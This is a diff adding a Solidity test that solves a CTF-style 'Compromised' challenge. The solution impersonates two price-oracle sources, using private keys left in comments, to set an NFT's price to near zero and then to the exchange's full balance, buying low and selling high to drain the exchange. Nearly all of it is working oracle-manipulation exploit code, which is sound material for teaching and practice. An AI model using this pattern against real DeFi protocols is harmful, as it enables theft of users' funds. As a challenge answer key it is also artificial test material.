@@ -75,6 +75,42 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        //store private key
+        // uint256 source1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        // uint256 source2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        //use privte keys to sign the transaction for source[0] and source[1]
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[1], PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[1], PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        uint256 id = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+        vm.stopPrank();
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[1], address(exchange).balance);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[1], address(exchange).balance);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        vm.stopPrank();
+
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[1], INITIAL_NFT_PRICE);
+        vm.stopPrank();
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[1], INITIAL_NFT_PRICE);
+        vm.stopPrank();
         
     }
 
